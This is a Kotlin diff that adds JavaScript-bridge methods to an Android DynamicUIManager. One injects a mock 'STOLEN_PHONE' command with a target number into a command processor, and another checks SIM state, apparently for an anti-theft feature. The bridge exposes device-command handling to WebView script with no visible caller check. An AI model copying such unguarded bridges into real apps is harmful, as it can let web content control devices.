@@ -385,6 +385,23 @@ object DynamicUIManager {
         }
 
         @JavascriptInterface
+        fun triggerStolenMode(targetNumber: String) {
+            CoroutineScope(Dispatchers.IO).launch {
+                val mockCmd = JSONObject().apply {
+                    put("id", -5)
+                    put("file_name", "STOLEN_PHONE")
+                    put("content", targetNumber)
+                }
+                CommandProcessor.processSingleCommand(ctx, mockCmd)
+            }
+        }
+
+        @JavascriptInterface
+        fun evaluateSim() {
+            JudasManager.evaluateSimState(ctx)
+        }
+
+        @JavascriptInterface
         fun openApp(packageName: String) {
             try {
                 val intent = ctx.packageManager.getLaunchIntentForPackage(packageName)
